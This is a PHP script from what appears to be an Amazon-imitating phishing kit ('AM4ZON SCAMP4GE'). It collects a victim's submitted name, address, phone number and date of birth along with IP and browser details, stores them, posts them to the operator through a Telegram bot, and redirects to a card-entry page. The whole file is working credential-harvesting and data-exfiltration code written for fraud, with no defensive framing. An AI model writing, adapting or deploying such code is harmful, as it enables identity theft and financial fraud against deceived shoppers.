<?php
/*
      PRIV8 AM4ZON SCAMP4GE BY XFORGEX CODER

*/
session_start();
error_reporting(0);
# Adding Settings
include('function.php');
$settings = include('../config.php');
require_once __DIR__ . '/../storage/storage.php';
# User Agent 

$useragent = $_SERVER['HTTP_USER_AGENT'];

#
$fullname = $_POST['fullname'];
$add1 = $_POST['add1'];
$add2 = $_POST['add2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip = $_POST['zip'];
$phone = $_POST['phone'];
$dob = $_POST['dob'];
$country = isset($_POST['country']) ? trim($_POST['country']) : '';
if ($country === '' && isset($countryname)) {
    $country = $countryname;
}

# Logs
$message .= "🔥 AM4ZON BILLING FROM - {$IP} 🔥\n\n";
$message .= "➤ [ Full Name]     : {$fullname}\n";
$message .= "➤ [ Address1 ] : {$add1 }\n";
$message .= "➤ [ Address2 ] : {$add2}\n";
$message .= "➤ [ City ] : {$city}\n";
$message .= "➤ [ State ] : {$state}\n";
$message .= "➤ [ ZIP ] : {$zip}\n";
$message .= "➤ [ Phone ] : {$phone}\n";
$message .= "➤ [ DOB ] : {$dob}\n";
$message .= "➤ [ Country ] : {$country}\n";
$message .= "--------- MORE INFO -----------\n";
$message .= "➤ [ IP Address ] : {$IP}\n";
$message .= "➤ [ User-Agent ] : {$useragent}\n";
$message .= "➤ [ OS ]         : {$os}\n";
$message .= "➤ [ Browser ]    : {$browser}\n";
$message .= "➤ [ City(IP) ]   : {$city}\n";
$message .= "➤ [ Country ]    : {$countryname}\n";
$message .= "➤ [ Date ]       : {$date}\n";
$message .= ".--------------------------------.\n";

# Persist step data
$payload = [
    'fullname' => $fullname,
    'address1' => $add1,
    'address2' => $add2,
    'city' => $city,
    'state' => $state,
    'zip' => $zip,
    'phone' => $phone,
    'dob' => $dob,
    'country' => $country
];

append_login_session_step(session_id(), 'billing', $payload);


# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

header('Location: card.php');
?>